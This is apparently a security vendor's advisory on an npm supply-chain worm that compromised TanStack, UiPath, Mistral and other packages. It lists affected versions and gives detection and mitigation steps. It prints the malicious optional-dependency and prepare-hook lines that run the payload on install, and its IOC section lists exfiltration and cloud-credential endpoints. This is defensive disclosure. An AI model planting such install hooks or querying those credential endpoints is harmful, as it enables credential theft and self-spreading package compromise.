Written by
Raphael Silva
Published on:
May 12, 2026
Mini Shai-Hulud is back. Like I said before, we were yet to see the full scale of the attack.

The npm campaign we covered in April, when it targeted SAP packages, has now turned into a much larger compromise. Our Malware Team detected 373 malicious package-version entries across 169 npm package names.

The basic goal is still the same: steal credentials from developer machines and CI/CD runners, then use those credentials to reach more packages.

What changed is the scale and the release path. This wave does not just look like someone manually publishing bad versions. The malware is built to run inside build systems, steal npm and GitHub access, and abuse trusted publishing paths to push new compromised packages.

If you read our earlier post, Mini Shai-Hulud Targets SAP npm Packages With a Bun-Based Secret Stealer, this is the follow-up: the same idea, but with a much bigger blast radius.

What Happened
TanStack is still one of the most visible clusters, but it is no longer the whole story. The affected set now includes packages across @squawk, @tanstack, @uipath, @tallyui, @beproduct, @mistralai, @draftlab, @draftauth, @taskflow-corp, @tolka, and several unscoped packages.

The largest clusters in this campaign are:

@squawk: 87 package-version entries
@tanstack: 83 package-version entries
@uipath: 66 package-version entries
unscoped packages: 39 package-version entries
@tallyui: 30 package-version entries
@beproduct: 18 package-version entries
This list is still moving. The important part is not only the number of packages, but where they run. These packages are likely to be installed in local developer environments, CI jobs, release workflows, and internal build systems.

That is exactly where npm tokens, GitHub tokens, cloud credentials, Kubernetes service account tokens, and deployment secrets tend to live.

Affected Packages And Versions
Current list of packages and versions our team has identified:

@tanstack/history: 1.161.9, 1.161.12
@tanstack/react-router: 1.169.5, 1.169.8
@tanstack/router-core: 1.169.5, 1.169.8
@tanstack/router-utils: 1.161.11, 1.161.14
@tanstack/router-plugin: 1.167.38, 1.167.41
@tanstack/virtual-file-routes: 1.161.10, 1.161.13
@tanstack/router-generator: 1.166.45, 1.166.48
@tanstack/start-server-core: 1.167.33, 1.167.36
@tanstack/start-client-core: 1.168.5, 1.168.8
@tanstack/start-storage-context: 1.166.38, 1.166.41
@tanstack/start-plugin-core: 1.169.23, 1.169.26
@tanstack/react-start-server: 1.166.55, 1.166.58
@tanstack/react-start-client: 1.166.51, 1.166.54
@tanstack/start-fn-stubs: 1.161.9, 1.161.12
@tanstack/react-start: 1.167.68, 1.167.71
@tanstack/react-start-rsc: 0.0.47, 0.0.50
@mistralai/mistralai: 2.2.2, 2.2.3, 2.2.4
@tanstack/react-router-devtools: 1.166.16, 1.166.19
@tanstack/router-devtools-core: 1.167.6, 1.167.9
@tanstack/router-devtools: 1.166.16, 1.166.19
@tanstack/router-ssr-query-core: 1.168.3, 1.168.6
@tanstack/react-router-ssr-query: 1.166.15, 1.166.18
@tanstack/router-cli: 1.166.46, 1.166.49
@tanstack/zod-adapter: 1.166.12, 1.166.15
@tanstack/eslint-plugin-router: 1.161.9
@tanstack/router-vite-plugin: 1.166.53, 1.166.56
@tanstack/nitro-v2-vite-plugin: 1.154.12, 1.154.15
@mistralai/mistralai-gcp: 1.7.1, 1.7.2, 1.7.3
@tanstack/solid-router: 1.169.5, 1.169.8
@tanstack/solid-start: 1.167.65, 1.167.68
@tanstack/solid-start-client: 1.166.50, 1.166.53
@tanstack/solid-start-server: 1.166.54, 1.166.57
@tanstack/solid-router-devtools: 1.166.16, 1.166.19
@tanstack/start-static-server-functions: 1.166.44, 1.166.47
@tanstack/vue-router: 1.169.5, 1.169.8
@uipath/apollo-react: 4.24.5
@tanstack/solid-router-ssr-query: 1.166.15, 1.166.18
safe-action: 0.8.3, 0.8.4
@tanstack/valibot-adapter: 1.166.12, 1.166.15
@tanstack/vue-start: 1.167.61, 1.167.64
@uipath/apollo-wind: 2.16.2
@uipath/cli: 1.0.1
@tanstack/vue-start-server: 1.166.50, 1.166.53
@squawk/types: 0.8.2, 0.8.3, 0.8.4
@uipath/rpa-tool: 0.9.5
@squawk/mcp: 0.9.1, 0.9.2, 0.9.3, 0.9.4
@tanstack/vue-start-client: 1.166.46, 1.166.49
@squawk/weather: 0.5.6, 0.5.7, 0.5.8, 0.5.9
@squawk/airspace: 0.8.1, 0.8.2, 0.8.3, 0.8.4
@squawk/icao-registry-data: 0.8.4, 0.8.5, 0.8.6, 0.8.7
@tanstack/arktype-adapter: 1.166.12, 1.166.15
@squawk/flightplan: 0.5.2, 0.5.3, 0.5.4, 0.5.5
@squawk/airports: 0.6.2, 0.6.3, 0.6.4, 0.6.5
@mesadev/sdk: 0.28.3
@squawk/geo: 0.4.4, 0.4.5, 0.4.6, 0.4.7
@mesadev/rest: 0.28.3
@squawk/procedure-data: 0.7.3, 0.7.4, 0.7.5, 0.7.6
@squawk/navaid-data: 0.6.4, 0.6.5, 0.6.6, 0.6.7
@squawk/fix-data: 0.6.4, 0.6.5, 0.6.6, 0.6.7
@squawk/navaids: 0.4.2, 0.4.3, 0.4.4, 0.4.5
@squawk/fixes: 0.3.2, 0.3.3, 0.3.4, 0.3.5
@squawk/airport-data: 0.7.4, 0.7.5, 0.7.6, 0.7.7
@squawk/airway-data: 0.5.4, 0.5.5, 0.5.6, 0.5.7
@squawk/units: 0.4.3, 0.4.4, 0.4.5, 0.4.6
@squawk/procedures: 0.5.2, 0.5.3, 0.5.4, 0.5.5
@squawk/airways: 0.4.2, 0.4.3, 0.4.4, 0.4.5
@squawk/icao-registry: 0.5.2, 0.5.3, 0.5.4, 0.5.5
@uipath/apollo-core: 5.9.2
@squawk/notams: 0.3.6, 0.3.7, 0.3.8, 0.3.9
@uipath/filesystem: 1.0.1
@uipath/solutionpackager-tool-core: 0.0.34
@squawk/flight-math: 0.5.4, 0.5.5, 0.5.6, 0.5.7
@squawk/airspace-data: 0.5.3, 0.5.4, 0.5.5, 0.5.6
@mistralai/mistralai-azure: 1.7.1, 1.7.2, 1.7.3
@uipath/solution-tool: 1.0.1
@tanstack/eslint-plugin-start: 0.0.4, 0.0.7
@uipath/maestro-tool: 1.0.1
@uipath/codedapp-tool: 1.0.1
@uipath/agent-tool: 1.0.1
@draftlab/auth: 0.24.1, 0.24.2
@uipath/orchestrator-tool: 1.0.1
@uipath/integrationservice-tool: 1.0.2
@taskflow-corp/cli: 0.1.24, 0.1.25, 0.1.26, 0.1.27, 0.1.28, 0.1.29
@tanstack/vue-router-ssr-query: 1.166.15, 1.166.18
@uipath/rpa-legacy-tool: 1.0.1
@uipath/vertical-solutions-tool: 1.0.1
@uipath/flow-tool: 1.0.2
@uipath/codedagent-tool: 1.0.1
@uipath/common: 1.0.1
@uipath/resource-tool: 1.0.1
@uipath/auth: 1.0.1
@uipath/docsai-tool: 1.0.1
@uipath/case-tool: 1.0.1
@uipath/api-workflow-tool: 1.0.1
@tanstack/vue-router-devtools: 1.166.16, 1.166.19
@uipath/test-manager-tool: 1.0.2
@uipath/robot: 1.3.4
@uipath/traces-tool: 1.0.1
@uipath/agent-sdk: 1.0.2
@uipath/integrationservice-sdk: 1.0.2
@uipath/maestro-sdk: 1.0.1
@uipath/data-fabric-tool: 1.0.2
@mesadev/saguaro: 0.4.22
@uipath/tasks-tool: 1.0.1
@uipath/insights-tool: 1.0.1
@uipath/insights-sdk: 1.0.1
@uipath/uipath-python-bridge: 1.0.1
@draftlab/db: 0.16.1
@uipath/ap-chat: 1.5.7
@uipath/project-packager: 1.1.16
@uipath/packager-tool-case: 0.0.9
@uipath/packager-tool-workflowcompiler-browser: 0.0.34
@uipath/packager-tool-connector: 0.0.19
@uipath/packager-tool-workflowcompiler: 0.0.16
@uipath/packager-tool-webapp: 1.0.6
@uipath/packager-tool-apiworkflow: 0.0.19
@uipath/packager-tool-functions: 0.1.1
ts-dna: 3.0.1, 3.0.2, 3.0.3, 3.0.4
@uipath/widget.sdk: 1.2.3
@uipath/resources-tool: 0.1.11
@uipath/agent.sdk: 0.0.18
cross-stitch: 1.1.3, 1.1.4, 1.1.5, 1.1.6
@uipath/codedagents-tool: 0.1.12
@uipath/aops-policy-tool: 0.3.1
@uipath/solution-packager: 0.0.35
@draftlab/auth-router: 0.5.1, 0.5.2
cmux-agent-mcp: 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8
agentwork-cli: 0.1.4, 0.1.5
@uipath/packager-tool-bpmn: 0.0.9
@draftauth/core: 0.13.1, 0.13.2
@dirigible-ai/sdk: 0.6.2, 0.6.3
@uipath/packager-tool-flow: 0.0.19
git-branch-selector: 1.3.3, 1.3.4, 1.3.5, 1.3.6, 1.3.7
wot-api: 0.8.1, 0.8.2, 0.8.3, 0.8.4
git-git-git: 1.0.8, 1.0.9, 1.0.10, 1.0.11, 1.0.12
@beproduct/nestjs-auth: 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9, 0.1.10, 0.1.11, 0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19
@ml-toolkit-ts/xgboost: 1.0.3, 1.0.4
nextmove-mcp: 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7
ml-toolkit-ts: 1.0.4, 1.0.5
@uipath/telemetry: 0.0.7
@draftauth/client: 0.2.1, 0.2.2
@ml-toolkit-ts/preprocessing: 1.0.2, 1.0.3
@tallyui/connector-medusa: 1.0.1, 1.0.2, 1.0.3
@uipath/tool-workflowcompiler: 0.0.12
@uipath/vss: 0.1.6
@tallyui/theme: 0.2.1, 0.2.2, 0.2.3
@tallyui/storage-sqlite: 0.2.1, 0.2.2, 0.2.3
@uipath/solutionpackager-sdk: 1.0.11
@tallyui/connector-vendure: 1.0.1, 1.0.2, 1.0.3
@tallyui/core: 0.2.1, 0.2.2, 0.2.3
@tallyui/connector-woocommerce: 1.0.1, 1.0.2, 1.0.3
@tallyui/components: 1.0.1, 1.0.2, 1.0.3
@uipath/ui-widgets-multi-file-upload: 1.0.1
@tallyui/pos: 0.1.1, 0.1.2, 0.1.3
@tallyui/database: 1.0.1, 1.0.2, 1.0.3
@supersurkhet/cli: 0.0.2, 0.0.3, 0.0.4, 0.0.5, 0.0.6, 0.0.7
@tallyui/connector-shopify: 1.0.1, 1.0.2, 1.0.3
@tolka/cli: 1.0.2, 1.0.3, 1.0.4, 1.0.5, 1.0.6
@supersurkhet/sdk: 0.0.2, 0.0.3, 0.0.4, 0.0.5, 0.0.6, 0.0.7
@uipath/access-policy-tool: 0.3.1
@uipath/context-grounding-tool: 0.1.1
@uipath/gov-tool: 0.3.1
@uipath/admin-tool: 0.1.1
@uipath/identity-tool: 0.1.1
@uipath/llmgw-tool: 1.0.1
@uipath/resourcecatalog-tool: 0.1.1
@uipath/functions-tool: 1.0.1
@uipath/access-policy-sdk: 0.3.1
@uipath/platform-tool: 1.0.1
How The New Wave Works
In the SAP wave, the compromised packages added a preinstall hook that ran setup.mjs, which then used Bun to execute a large obfuscated payload named execution.js.

This wave uses a slightly different route.

In compromised TanStack packages, the package tarball includes a new obfuscated file at the package root:

router_init.js

The compromised package also adds an optional dependency that points to a GitHub-hosted package

"optionalDependencies": {
  "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
}
That Git dependency contains a prepare script:

"scripts": {
  "prepare": "bun run tanstack_runner.js && exit 1"
}
This is the trick. npm runs lifecycle scripts for Git dependencies during installation. So a package that looks like a normal dependency can quietly reach into a GitHub-hosted dependency, run its prepare hook, and execute the payload.

The && exit 1 at the end is also interesting. Because the dependency is optional, failing after the payload runs can make the install look less suspicious. The malicious code has already executed by the time npm treats the optional dependency as failed.

Why Trusted Publishing Matters Here
One of the more uncomfortable parts of this wave is the use of trusted publishing.

Trusted publishing is meant to remove long-lived npm tokens from release workflows. A GitHub Actions workflow can use OIDC to request a short-lived npm publish token, publish the package, and attach provenance to the release.

That is good when the workflow is clean.

It is much worse when attacker-controlled code runs inside the workflow. At that point, the attacker may not need to steal a long-lived npm token at all. They can use the workflow's own OIDC permissions to mint a publish token during the build and publish from there.

That also means provenance is not a full safety signal. A malicious package can still come from the expected GitHub Actions workflow if that workflow was abused during the release.

In plain English: provenance can tell you where the package was built. It does not prove the build was safe.

What The Payload Tries To Steal
The payload is built for CI/CD and developer environments.

It looks for:

GitHub tokens
npm tokens
GitHub Actions OIDC tokens
AWS credentials and instance metadata
Kubernetes service account files
HashiCorp Vault tokens and local Vault endpoints
environment variables
local filesystem secrets
The payload also contains propagation logic. After stealing tokens, it attempts to use them to find packages the victim can publish, modify package archives, inject the malicious dependency, bump versions, and publish new compromised releases.

That is what makes this more than a normal infostealer. The malware is not only trying to steal from the current victim. It is trying to turn the victim's release access into the next infection path.

What Changed From The SAP Attack
The SAP wave was smaller in package count but still high impact because it touched enterprise build tooling.

This wave is broader. TanStack packages are widely used in modern JavaScript applications, especially routing and full-stack React tooling. A compromised package in that part of the dependency tree can land in a lot of places quickly.

There are also some technical changes:

the SAP packages used setup.mjs and execution.js
the newer TanStack wave uses router_init.js and a GitHub-hosted @tanstack/setup dependency
the newer wave leans harder on GitHub Actions, OIDC, npm publishing, and package repacking
the payload is still Bun-based and still focused on stealing secrets
The pattern is the same, though: get code execution during install, steal credentials, use those credentials to publish more malware.

Detection And Mitigation
Start with lockfiles and package caches.

Search for affected namespaces and packages:

@squawk/
@tanstack/
@uipath/
@tallyui/
@beproduct/nestjs-auth
@mistralai/
@draftauth/
@draftlab/
@taskflow-corp/cli
@tolka/cli
@ml-toolkit-ts/
@mesadev/
@dirigible-ai/sdk
@supersurkhet/
unscoped packages listed above, including safe-action, ts-dna, cross-stitch, cmux-agent-mcp, agentwork-cli, git-branch-selector, wot-api, git-git-git, nextmove-mcp, and ml-toolkit-ts
Search for the new payload files and dependency markers:

router_init.js
router_runtime.js
tanstack_runner.js
@tanstack/setup
github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c
bun run tanstack_runner.js
Search CI logs for:

unexpected Bun execution during npm install
optional dependency failures involving @tanstack/setup
outbound connections during dependency installation
npm publish activity from workflows that should not have published
GitHub Actions OIDC token requests during unexpected steps
If a compromised package version ran on a developer machine or CI runner, rotate secrets from that environment. Do not stop at npm tokens.

Rotate or review:

npm tokens and package publishing access
GitHub PATs and GitHub Actions secrets
cloud credentials
Kubernetes service account tokens
Vault tokens
deployment secrets
Also audit recent npm publishes, GitHub Actions runs, and provenance records. A valid provenance record should not be treated as proof that the package is clean.

Indicators Of Compromise
Files and payloads:

router_init.js
router_runtime.js
tanstack_runner.js
router_init.js SHA-256: ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c
tanstack_runner.js SHA-256: 2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96
Package markers:

@tanstack/setup
github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c
prepare script running bun run tanstack_runner.js
root-level payload file included outside the normal package contents
Network and service indicators:

hxxp://filev2[.]getsession[.]org/file/
hxxp://169[.]254[.]169[.]254/latest/meta-data/iam/security-credentials/
hxxp://169[.]254[.]170[.]2
hxxps://registry[.]npmjs[.]org/-/npm/v1/tokens
vault[.]svc[.]cluster[.]local:8200
Campaign markers:

A Mini Shai-Hulud has Appeared
Dune-themed repository names used for worm output and staging
Conclusion
Mini Shai-Hulud has moved from a smaller SAP-focused incident into a broader npm supply-chain attack.

The important lesson is not just that more packages were compromised. It is that the malware is built around the way modern release systems work. It runs during install, looks for CI/CD credentials, abuses GitHub and npm publishing paths, and tries to push itself into the next package.

If any of the affected packages ran in your environment, treat the machine or runner as exposed until secrets are rotated and recent publish activity has been reviewed.

How Aikido Detects This
If you are an Aikido user, check your central feed and filter on malware issues. This will surface as a 100/100 critical issue. Aikido rescans nightly, but we recommend triggering a manual rescan now.

If you are not yet an Aikido user, you can create an account and connect your repos. Our malware coverage is included in the free plan, no credit card required.

For broader coverage across your whole team, Aikido's Endpoint Protection gives you visibility and control over the software packages installed on your team's devices. It covers browser extensions, code libraries, IDE plugins, and build dependencies, all in one place. Stop malware before it gets installed.

For future protection, consider Aikido Safe Chain (open source). Safe Chain sits in your existing workflow, intercepting npm, npx, yarn, pnpm, and pnpx commands and checking packages against Aikido Intel before install.